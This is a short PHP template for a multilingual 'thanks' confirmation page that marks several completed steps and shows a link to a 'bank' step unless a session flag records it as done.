<?
session_start();
include('../lang/language.php');
?>
<div class="content_thanks">
<div id="thanks">
<div class="icon_success"><div class="ico"></div></div>
<h2> <?=$language['thanks'][1] ?> </h2>
<p ><?=$language['thanks'][2] ?> </p>
<table class="list">
	<tr>
		<td><?=$language['home'][4] ?></td>
		<td><div class="ico icoSmall"></div></td>
	</tr>
	<tr>
		<td><?=$language['home'][1] ?></td>
		<td><div class="ico icoSmall"></div></td>
	</tr>
	<tr>
		<td><?=$language['home'][32] ?></td>
		<td><div class="ico icoSmall"></div></td>
	</tr>
	<? 
	if ($_SESSION['bank'] !== 'success') {
	 	echo('<tr>
		<td><button onclick="window.location.href=\'bank\'">'.$language['thanks'][3].'</button></td>
		<td><div class="icon_link"></div></td>
	</tr>');
	 }else{
	 	echo('<tr>
		<td>'.$language['thanks'][3].'</td>
		<td><div class="ico icoSmall"></div></td>
	</tr>');
	 }
	?>

</table>
<a class="btn block"><?=$language['thanks'][4] ?></a>
</div>	</div>